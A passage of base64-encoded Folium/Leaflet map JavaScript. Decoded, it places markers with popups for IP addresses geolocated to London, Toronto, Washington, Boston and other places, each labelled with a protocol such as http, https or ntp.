diNTg4NWUgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzUxLjUxNDIsIC0wLjA5MzFdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl82MDhmMmYxZjdlYzA0MDk2YmE2NTc2Yzg1N2Y1MDYwNiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8zODg3ODI5Njk1ZDc0OTNjOWQ5MmFhMjY3N2I1ODg1ZS5zZXRJY29uKGljb25fNjA4ZjJmMWY3ZWMwNDA5NmJhNjU3NmM4NTdmNTA2MDYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNTAxOWVhNjg5M2Y1NDc3Yjg3NWU5MGViMjkyYTAzMjggPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9lNGQyZGUyMTA0MGM0Nzk1ODBlOTY4MDNiMzljYzMzOSA9ICQoYDxkaXYgaWQ9Imh0bWxfZTRkMmRlMjEwNDBjNDc5NTgwZTk2ODAzYjM5Y2MzMzkiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUdCLCBDb3VudHJ5TmFtZT1Vbml0ZWQgS2luZ2RvbSwgU3RhdGU9RW5nbGFuZCwgQ2l0eT1Mb25kb24sIExvbmdpdHVkZT0tMC4wOTMxLCBMYXRpdHVkZT01MS41MTQyPGJyPjkxLjE4OS44OC4xNjI8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNTAxOWVhNjg5M2Y1NDc3Yjg3NWU5MGViMjkyYTAzMjguc2V0Q29udGVudChodG1sX2U0ZDJkZTIxMDQwYzQ3OTU4MGU5NjgwM2IzOWNjMzM5KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMzg4NzgyOTY5NWQ3NDkzYzlkOTJhYTI2NzdiNTg4NWUuYmluZFBvcHVwKHBvcHVwXzUwMTllYTY4OTNmNTQ3N2I4NzVlOTBlYjI5MmEwMzI4KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8zODg3ODI5Njk1ZDc0OTNjOWQ5MmFhMjY3N2I1ODg1ZS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBMb25kb24sIFVuaXRlZCBLaW5nZG9tLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfYjI5NTg2MjkxNGM2NGQwN2E5ZDI2N2EyNjZlODVlYWMgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZWM2MjcwOWQzYTVmNDA0OWFkMTQ4MDQ4MTllMmMwYmUgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYjI5NTg2MjkxNGM2NGQwN2E5ZDI2N2EyNjZlODVlYWMuc2V0SWNvbihpY29uX2VjNjI3MDlkM2E1ZjQwNDlhZDE0ODA0ODE5ZTJjMGJlKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2E3YWVkYmExM2NjNjRjYzg5NmVlN2M1NjdjMGUwZTAwID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfZGIxM2IwMGMzYTExNGZiZTg1ODJkYWEwOTk0ZjlkYTAgPSAkKGA8ZGl2IGlkPSJodG1sX2RiMTNiMDBjM2ExMTRmYmU4NTgyZGFhMDk5NGY5ZGEwIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj4xMy43MS4xNzIuMTI4PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9hN2FlZGJhMTNjYzY0Y2M4OTZlZTdjNTY3YzBlMGUwMC5zZXRDb250ZW50KGh0bWxfZGIxM2IwMGMzYTExNGZiZTg1ODJkYWEwOTk0ZjlkYTApOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9iMjk1ODYyOTE0YzY0ZDA3YTlkMjY3YTI2NmU4NWVhYy5iaW5kUG9wdXAocG9wdXBfYTdhZWRiYTEzY2M2NGNjODk2ZWU3YzU2N2MwZTBlMDApCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2IyOTU4NjI5MTRjNjRkMDdhOWQyNjdhMjY2ZTg1ZWFjLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl85YjhiYjdjYWQ5OGE0N2ExYWZkNDcyZWJhMDAzMzJjMCA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl82MDdjODViYmY2YjU0MDljOGY2YmM2N2E3YjJlM2E2NiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl85YjhiYjdjYWQ5OGE0N2ExYWZkNDcyZWJhMDAzMzJjMC5zZXRJY29uKGljb25fNjA3Yzg1YmJmNmI1NDA5YzhmNmJjNjdhN2IyZTNhNjYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNmYyZmI3MDNhMWE2NDAxZWJlZDA2ZjI3ODE3YzdlODkgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF83YmUzMWJlMTQ5OTQ0MzEzOTkwZWEyN2JhNzU1ZDIwNiA9ICQoYDxkaXYgaWQ9Imh0bWxfN2JlMzFiZTE0OTk0NDMxMzk5MGVhMjdiYTc1NWQyMDYiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC42NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNmYyZmI3MDNhMWE2NDAxZWJlZDA2ZjI3ODE3YzdlODkuc2V0Q29udGVudChodG1sXzdiZTMxYmUxNDk5NDQzMTM5OTBlYTI3YmE3NTVkMjA2KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfOWI4YmI3Y2FkOThhNDdhMWFmZDQ3MmViYTAwMzMyYzAuYmluZFBvcHVwKHBvcHVwXzZmMmZiNzAzYTFhNjQwMWViZWQwNmYyNzgxN2M3ZTg5KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl85YjhiYjdjYWQ5OGE0N2ExYWZkNDcyZWJhMDAzMzJjMC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzlmNDM1Yjc2ZDJlZjQxNWM5N2I0ODk5YWNmMTc4ZmQxID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2I0N2ZiMDBhZTU3ZjRhNmY5ZDBhNWYwMTA4MmZhMGRlID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzlmNDM1Yjc2ZDJlZjQxNWM5N2I0ODk5YWNmMTc4ZmQxLnNldEljb24oaWNvbl9iNDdmYjAwYWU1N2Y0YTZmOWQwYTVmMDEwODJmYTBkZSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9mZTcwMTBjODRjMTA0YWY2OTcyYzU5OTY4YTZkYzUyYSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzlkMjg2M2U2NDVjZjQ5OWI5N2ZkODM5YzBmNzYzMWExID0gJChgPGRpdiBpZD0iaHRtbF85ZDI4NjNlNjQ1Y2Y0OTliOTdmZDgzOWMwZjc2MzFhMSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuODguMjU1LjExNTxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfZmU3MDEwYzg0YzEwNGFmNjk3MmM1OTk2OGE2ZGM1MmEuc2V0Q29udGVudChodG1sXzlkMjg2M2U2NDVjZjQ5OWI5N2ZkODM5YzBmNzYzMWExKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfOWY0MzViNzZkMmVmNDE1Yzk3YjQ4OTlhY2YxNzhmZDEuYmluZFBvcHVwKHBvcHVwX2ZlNzAxMGM4NGMxMDRhZjY5NzJjNTk5NjhhNmRjNTJhKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl85ZjQzNWI3NmQyZWY0MTVjOTdiNDg5OWFjZjE3OGZkMS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMzBkMmZlYjY1NDlmNDJmNGI4ZDQyNzA3ZWEwZWVlNWQgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQyLjM1ODQsIC03MS4wNTk4XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fOTk2NDYwM2UyYTYyNGQyOWIzZjJlMGZiYjZjYWIwMmEgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMzBkMmZlYjY1NDlmNDJmNGI4ZDQyNzA3ZWEwZWVlNWQuc2V0SWNvbihpY29uXzk5NjQ2MDNlMmE2MjRkMjliM2YyZTBmYmI2Y2FiMDJhKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2I4ZWUzMGE1MWRhYzQxODU4ZTE1YWEwNWNiZTAyOTM3ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfM2FiNjdjZDcyNTQzNGY4ZGE4YTFhMGY3NzM5Yzc1ZmEgPSAkKGA8ZGl2IGlkPSJodG1sXzNhYjY3Y2Q3MjU0MzRmOGRhOGExYTBmNzczOWM3NWZhIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9TWFzc2FjaHVzZXR0cywgQ2l0eT1Cb3N0b24sIExvbmdpdHVkZT0tNzEuMDU5OCwgTGF0aXR1ZGU9NDIuMzU4NDxicj45MS4xODkuOTEuMjM8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfYjhlZTMwYTUxZGFjNDE4NThlMTVhYTA1Y2JlMDI5Mzcuc2V0Q29udGVudChodG1sXzNhYjY3Y2Q3MjU0MzRmOGRhOGExYTBmNzczOWM3NWZhKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMzBkMmZlYjY1NDlmNDJmNGI4ZDQyNzA3ZWEwZWVlNWQuYmluZFBvcHVwKHBvcHVwX2I4ZWUzMGE1MWRhYzQxODU4ZTE1YWEwNWNiZTAyOTM3KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8zMGQyZmViNjU0OWY0MmY0YjhkNDI3MDdlYTBlZWU1ZC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBCb3N0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl84NTU2MTE0NzJlYzE0M2I1OTFkZjI2MTY0NTE4MGE4MiA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl80MTg2ZDA0YTkxNGE0ODVlYmM0ZDBjNzIyYWQ4ZTRiMiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl84NTU2MTE0NzJlYzE0M2I1OTFkZjI2MTY0NTE4MGE4Mi5zZXRJY29uKGljb25fNDE4NmQwNGE5MTRhNDg1ZWJjNGQwYzcyMmFkOGU0YjIpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNjk5NmM4OGY4YjJlNDRhMWEzY2I5NzExNGFhZjJlYTcgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9hM2MyMTIzZTVhZDI0MGVkYWMzYTkyOGQyYjZiZjRjMyA9ICQoYDxkaXYgaWQ9Imh0bWxfYTNjMjEyM2U1YWQyNDBlZGFjM2E5MjhkMmI2YmY0YzMiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+MTM4LjkxLjk2Ljg0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF82OTk2Yzg4ZjhiMmU0NGExYTNjYjk3MTE0YWFmMmVhNy5zZXRDb250ZW50KGh0bWxfYTNjMjEyM2U1YWQyNDBlZGFjM2E5MjhkMmI2YmY0YzMpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl84NTU2MTE0NzJlYzE0M2I1OTFkZjI2MTY0NTE4MGE4Mi5iaW5kUG9wdXAocG9wdXBfNjk5NmM4OGY4YjJlNDRhMWEzY2I5NzExNGFhZjJlYTcpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzg1NTYxMTQ3MmVjMTQzYjU5MWRmMjYxNjQ1MTgwYTgyLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfZmViM2M2MWM5YmQ1NDgxZWJiZmIxZDFjODgwNzE2NDMgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM3Ljc1MSwgLTk3LjgyMl0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2QwZDA5MTlhNGNmNzRiZDY4NzhjMDAzNmEwNTNhMGM3ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2ZlYjNjNjFjOWJkNTQ4MWViYmZiMWQxYzg4MDcxNjQzLnNldEljb24oaWNvbl9kMGQwOTE5YTRjZjc0YmQ2ODc4YzAwMzZhMDUzYTBjNyk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF80ZmQyOTAwNWQyYTQ0MzFhYmViMWNiMzdkZWJkMDRkYyA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2I2ODUzZDBjYzk0OTQ2NTI5ZGMyNzg2OWM2NWRlMGJhID0gJChgPGRpdiBpZD0iaHRtbF9iNjg1M2QwY2M5NDk0NjUyOWRjMjc4NjljNjVkZTBiYSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIExvbmdpdHVkZT0tOTcuODIyLCBMYXRpdHVkZT0zNy43NTE8YnI+MjAuMzguOTguMTY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF80ZmQyOTAwNWQyYTQ0MzFhYmViMWNiMzdkZWJkMDRkYy5zZXRDb250ZW50KGh0bWxfYjY4NTNkMGNjOTQ5NDY1MjlkYzI3ODY5YzY1ZGUwYmEpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9mZWIzYzYxYzliZDU0ODFlYmJmYjFkMWM4ODA3MTY0My5iaW5kUG9wdXAocG9wdXBfNGZkMjkwMDVkMmE0NDMxYWJlYjFjYjM3ZGViZDA0ZGMpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2ZlYjNjNjFjOWJkNTQ4MWViYmZiMWQxYzg4MDcxNjQzLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYE5vbmUsIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfNjFmMTVhN2RlMjMwNDFjYmFlNTg3Njc5ZjUzNDI4MjYgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzUxLjUxNDIsIC0wLjA5MzFdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl81NTcwYTFjMTZhNjE0ODExYWJkZDdlNWJiNzc4YWViMSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl82MWYxNWE3ZGUyMzA0MWNiYWU1ODc2NzlmNTM0MjgyNi5zZXRJY29uKGljb25fNTU3MGExYzE2YTYxNDgxMWFiZGQ3ZTViYjc3OGFlYjEpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZGQxMWI4MzljMTdkNGFjNWE4MDAyN2UyNzJjNWM2MzAgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF80MTMyMmNlMTY2YWU0ZTY5YWQyZDQ3ZTE2YjkwNDhiZCA9ICQoYDxkaXYgaWQ9Imh0bWxfNDEzMjJjZTE2NmFlNGU2OWFkMmQ0N2UxNmI5MDQ4YmQiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUdCLCBDb3VudHJ5TmFtZT1Vbml0ZWQgS2luZ2RvbSwgU3RhdGU9RW5nbGFuZCwgQ2l0eT1Mb25kb24sIExvbmdpdHVkZT0tMC4wOTMxLCBMYXRpdHVkZT01MS41MTQyPGJyPjkxLjE4OS45NC40PGJyPnByb3RvY29sPW50cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfZGQxMWI4MzljMTdkNGFjNWE4MDAyN2UyNzJjNWM2MzAuc2V0Q29udGVudChodG1sXzQxMzIyY2UxNjZhZTRlNjlhZDJkNDdlMTZiOTA0OGJkKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNjFmMTVhN2RlMjMwNDFjYmFlNTg3Njc5ZjUzNDI4MjYuYmluZFBvcHVwKHBvcHVwX2RkMTFiODM5YzE3ZDRhYzVhODAwMjdlMjcyYzVjNjMwKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl82MWYxNWE3